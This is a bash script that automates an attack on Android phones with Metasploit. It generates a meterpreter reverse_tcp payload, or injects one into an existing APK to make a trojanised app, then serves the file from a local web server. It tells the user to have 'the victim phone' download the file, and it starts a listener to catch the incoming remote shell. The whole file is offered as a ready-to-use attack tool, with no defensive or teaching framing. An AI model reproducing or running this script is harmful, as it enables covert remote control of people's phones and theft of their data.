echo "please enter your ip:-";
read ip;
echo "please enter your port";
read port;
echo "1.for new making a payload\n2.for injecting payload in apk";
read ch;
if [ $ch -eq 1 ]
then
   echo "please enter the payload name with out .apk extention"
   read pnm;
   msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$port -o "$pnm.apk"
else
   echo "[*]please enter apk name with out .apk extention"
   read nm;
   echo "[*]please enter the payload name with out .apk extention"
   read pnm;
   msfvenom -x "$nm.apk" -p android/meterpreter/reverse_tcp lhost=$ip lport=$port -o "$pnm.apk"
fi
mv "$pnm.apk" /var/www/html
FILE=/var/www/html/"$pnm.apk"
if [ -f "$FILE" ] 
then
   echo "[*]now the playload has been created and now you just have to open the browser int he victim phone and type"
   echo "$ip/$pnm.apk"
   cat /dev/null > rec.rc
   echo "use exploit/multi/handler" >> rec.rc
   echo "set payload android/meterpreter/reverse_tcp" >> rec.rc
   echo "set lhost $ip" >> rec.rc
   echo "set lport $port" >> rec.rc
   echo "run" >> rec.rc
   msfconsole -r rec.rc
else
   echo "[-]Failed to create the playlod..."
   exit 0
fi


